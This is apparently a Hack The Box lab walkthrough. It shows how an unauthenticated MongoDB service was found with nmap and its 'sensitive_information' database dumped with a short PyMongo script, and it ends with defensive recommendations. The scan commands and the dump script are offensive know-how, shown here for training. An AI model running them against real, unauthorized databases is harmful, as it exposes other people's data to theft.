# 🔓 HTB MongoDB – Anonymous Access Enumeration Walkthrough

<p align="center">

![Security](https://img.shields.io/badge/Security-Pentesting-red)
![Platform](https://img.shields.io/badge/Platform-HTB-green)
![Category](https://img.shields.io/badge/Category-Misconfiguration-blue)
![Database](https://img.shields.io/badge/Database-MongoDB-brightgreen)
![Difficulty](https://img.shields.io/badge/Difficulty-Easy-orange)

</p>

---

## 📌 Overview

This lab demonstrates how an exposed MongoDB instance without authentication can lead to sensitive information disclosure.

⚠️ This activity was performed in an authorized lab/test environment for educational purposes only.

---

## 🎯 Objective

Identify exposed services, enumerate MongoDB, and retrieve sensitive information from the exposed database.

---

## 🌐 Reconnaissance

### Nmap Full Port Scan

```bash
nmap -v -Pn -p- --min-rate 10000 -T4 <TARGET-IP>
```

### Discovered Services

| Port | Service | Observation |
|------|---------|-------------|
| 22 | SSH | Requires credentials |
| 27017 | MongoDB | Exposed database service |

---

## 🧠 Attacker Mindset

At first glance, SSH looked interesting.

```text
SSH exposed
↓
Credentials required
↓
Not immediately useful
```

MongoDB was more interesting.

```text
MongoDB exposed
↓
Common misconfiguration
↓
Possible anonymous access
↓
Prioritize enumeration
```

---

## 🔍 MongoDB Enumeration

### Nmap MongoDB Scripts

```bash
nmap -p27017 --script mongodb-info,mongodb-databases <TARGET-IP>
```

### Databases Discovered

```text
admin
config
local
users
sensitive_information
```

Interesting databases:

```text
users
sensitive_information
```

---

## 🧪 Client Troubleshooting

The local MongoDB client failed with:

```bash
zsh: illegal hardware instruction mongo
```

`mongosh` was not available.

PyMongo initially failed due to a MongoDB wire version mismatch.

The target MongoDB version was older:

```text
featureCompatibilityVersion: 3.6
```

Solution used:

```bash
python3 -m venv mongoenv
source mongoenv/bin/activate
pip install pymongo==3.12.3
```

---

## 📂 Database Investigation

### Python Enumeration Script

```python
from pymongo import MongoClient

client = MongoClient("mongodb://<TARGET-IP>:27017/")

db = client["sensitive_information"]

print("[+] Collections:", db.list_collection_names())

for col in db.list_collection_names():
    print("\n[+] Collection:", col)

    for doc in db[col].find():
        print(doc)
```

### Collection Found

```text
flag
```

### Sensitive Data Example

```json
{
  "_id": "<redacted>",
  "flag": "flag{REDACTED}"
}
```

---

## ⚔️ Attack Flow

```text
🔍 Nmap Scan
      ↓
🗄️ MongoDB Service Discovery
      ↓
🔓 Anonymous Database Access
      ↓
📂 Database Enumeration
      ↓
🚨 Sensitive Information Discovery
      ↓
🏁 Flag Retrieved
```

---

## 🔐 What About SSH?

SSH was discovered on port 22, but it was not used in the final attack path.

```text
SSH discovered
↓
Credentials required
↓
No SSH credentials found in MongoDB
↓
Not used for exploitation
```

Key lesson:

```text
Not every open service becomes part of the attack chain.
```

---

## 🎯 MITRE ATT&CK Mapping

| Technique ID | Technique Name |
|-------------|----------------|
| T1595 | Active Scanning |
| T1046 | Network Service Discovery |
| T1213 | Data from Information Repositories |

---

## 💥 Security Impact

An exposed MongoDB instance without authentication may lead to:

- 🔑 Credential exposure
- 🔐 API key leakage
- 👤 User data exposure
- 📄 Sensitive business data disclosure
- 🏢 Internal application data leakage

---

## 🛡️ Defensive Recommendations

✅ Enable MongoDB authentication

✅ Restrict MongoDB access to private networks

✅ Use firewall rules or VPN-based access

✅ Avoid exposing database services directly to the internet

✅ Monitor exposed services continuously

✅ Review cloud security groups and firewall rules regularly

---

## 📚 Lessons Learned

💡 Enumeration is often more important than exploitation.

💡 Misconfigurations can be as dangerous as software vulnerabilities.

💡 Exposed databases should always require authentication.

💡 SSH being open does not automatically mean it is exploitable.

💡 Attackers follow the path of least resistance.

---

## ⚠️ Disclaimer

This walkthrough was created from an authorized test/lab environment for educational purposes only.

Do not perform these activities against systems without explicit permission.
